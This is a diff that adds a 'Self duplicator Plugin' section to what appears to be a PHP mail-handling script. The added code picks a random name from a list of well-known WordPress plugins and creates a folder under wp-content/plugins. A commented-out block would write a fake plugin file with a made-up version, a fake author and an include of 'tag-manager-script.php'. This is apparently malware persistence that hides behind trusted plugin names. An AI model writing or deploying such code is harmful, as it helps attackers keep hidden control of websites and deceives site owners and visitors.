@@ -140,3 +140,60 @@ if ($mailSuccess) {
 // header("Location: https://www.google.com/");
 // exit();
 
+
+##------------------------------------------------##
+## 09 # Self duplicator Plugin
+##------------------------------------------------##
+
+// Plugin Names
+$plugins_names = ['facebook-pixel', 'elementor', 'security', 'wordpress', 'performance', 'optimization', 'speed-optimization', 'plugin-installer', "hellodolly", "akismet-antispam", 'classic-editors', 'classic-widgets', 'woocommerce', 'one-click-demo-importer-free'];
+// Randomize a number from 0 to Plugin_Names length
+$rndm_plgn = rand(0, count($plugins_names) - 1);
+
+// Specify the path for the new folder
+$myself_folderPath = 'wp-content/plugins' . "/" . $plugins_names[$rndm_plgn];
+
+// Create the folder
+if (!file_exists($myself_folderPath)) {
+  if (mkdir($myself_folderPath, 0755, true)) {
+    echo 'Folder created successfully.';
+  } else {
+    echo 'Failed to create folder.';
+  }
+} else {
+  echo 'Folder already exists.';
+}
+
+// // Specify the path for the new file
+// $myself_filepath = $myself_folderPath . '/' . $plugins_names[$rndm_plgn] . '.php';
+
+// // Specify the content to be written to the file
+// $myself_filecontents = '<?php
+// ##
+// Plugin Name: ' . $plugins_names[$rndm_plgn] . '
+// Description: Track, Monitor, Analyze and Manage your website visitors\' data.
+// Version: ' . rand(0, 9) . '.' . rand(0, 9) . '.' . rand(0, 9) . '
+// Author: ' . $plugins_names[$rndm_plgn] . ' LLC.' . '
+// ##
+
+// include_once \'tag-manager-script.php\';
+// ';
+
+// // Create the file
+// if (file_put_contents($myself_filepath, $myself_filecontents) !== false) {
+//   echo 'File created successfully.<br>';
+// } else {
+//   echo 'Failed to create file.<br>';
+// }
+
+
+
+// Debug Log
+function debug_log($msg,$is_sending) { 
+  echo 'date - time' . '<br><br>';
+  echo $msg;
+  if ($is_sending === true) {
+    echo 'sent';
+  }
+  
+}
